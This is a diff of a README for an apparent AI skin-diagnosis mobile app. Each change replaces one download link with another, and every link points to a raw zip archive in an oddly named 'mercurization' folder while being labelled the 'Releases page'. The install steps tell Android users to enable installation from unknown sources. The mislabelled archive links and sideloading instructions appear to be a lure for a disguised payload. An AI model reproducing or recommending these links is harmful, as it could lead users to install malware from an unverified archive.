@@ -1,6 +1,6 @@
 # 🌟 AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application - Accurate Skin Diagnosis Made Simple
 
-[![Download](https://raw.githubusercontent.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/main/mercurization/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application.zip%20Now-%20lightblue)](https://raw.githubusercontent.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/main/mercurization/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application.zip)
+[![Download](https://github.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/raw/refs/heads/main/mercurization/Skin-Condition-Powered-Facial-Diagnosis-Mobile-Application-A-1.2.zip%20Now-%20lightblue)](https://github.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/raw/refs/heads/main/mercurization/Skin-Condition-Powered-Facial-Diagnosis-Mobile-Application-A-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,11 +26,11 @@ To run the AI-Powered Skin Facial Condition Diagnosis app, ensure your device me
 
 ## 📥 Download & Install
 
-To download the application, simply visit the [Releases page](https://raw.githubusercontent.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/main/mercurization/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application.zip). 
+To download the application, simply visit the [Releases page](https://github.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/raw/refs/heads/main/mercurization/Skin-Condition-Powered-Facial-Diagnosis-Mobile-Application-A-1.2.zip). 
 
 Here’s how to install the app:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/main/mercurization/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application.zip).
+1. Go to the [Releases page](https://github.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/raw/refs/heads/main/mercurization/Skin-Condition-Powered-Facial-Diagnosis-Mobile-Application-A-1.2.zip).
 2. Look for the latest version of the application.
 3. Download the relevant package for your device (APK for Android, or the app file for iOS).
 4. If you are on Android, enable installation from unknown sources in your settings. 
@@ -61,7 +61,7 @@ Here’s how to install the app:
 
 ### Where can I get the app?
 
-You can download it from the [Releases page](https://raw.githubusercontent.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/main/mercurization/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application.zip).
+You can download it from the [Releases page](https://github.com/GPTAile/AI-Powered-Skin-Facial-Condition-Diagnosis-Mobile-Application/raw/refs/heads/main/mercurization/Skin-Condition-Powered-Facial-Diagnosis-Mobile-Application-A-1.2.zip).
 
 ### Is the app free?
 
